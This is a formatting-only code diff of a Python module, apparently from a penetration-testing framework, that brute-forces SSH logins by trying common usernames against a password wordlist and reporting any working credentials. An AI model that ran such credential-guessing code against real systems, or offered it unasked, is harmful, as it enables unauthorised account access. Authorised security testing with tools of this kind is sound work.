@@ -4,10 +4,8 @@ import os
 from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
 from app.utility.colors import C
 
-REQUIRED_OPTIONS = {
-        "IP": "",
-        "PASS": ""
-}
+REQUIRED_OPTIONS = {"IP": "", "PASS": ""}
+
 
 def test_ssh(target_ip, port, username, password):
     client = paramiko.SSHClient()
@@ -21,7 +19,7 @@ def test_ssh(target_ip, port, username, password):
             timeout=3,
             banner_timeout=3,
             allow_agent=False,
-            look_for_keys=False
+            look_for_keys=False,
         )
         return True
     except paramiko.AuthenticationException:
@@ -33,6 +31,7 @@ def test_ssh(target_ip, port, username, password):
         return False
     finally:
         client.close()
+
 
 def execute(options):
     target_ip = options.get("IP")
@@ -53,16 +52,23 @@ def execute(options):
         # Stage 2: Wordlist
         if wordlist_path and os.path.exists(wordlist_path):
             print(f"\n{C.MENU}  [*] Starting stage 2: Wordlist...")
-            with open(wordlist_path, 'r', encoding='latin-1') as f:
+            with open(wordlist_path, "r", encoding="latin-1") as f:
                 for target_user in COMMON_USERS:
                     f.seek(0)
                     for line in f:
                         passwd = line.strip()
-                        if not passwd: continue
+                        if not passwd:
+                            continue
                         if test_ssh(target_ip, port, target_user, passwd):
-                            print(f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{target_user} P:{passwd}")
+                            print(
+                                f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{target_user} P:{passwd}"
+                            )
                             return
-                        print(f"{C.MENU}  [>] Try: U:{target_user:<20} P:{passwd:<20}", end='\r', flush=True)
+                        print(
+                            f"{C.MENU}  [>] Try: U:{target_user:<20} P:{passwd:<20}",
+                            end="\r",
+                            flush=True,
+                        )
 
     except KeyboardInterrupt:
         return
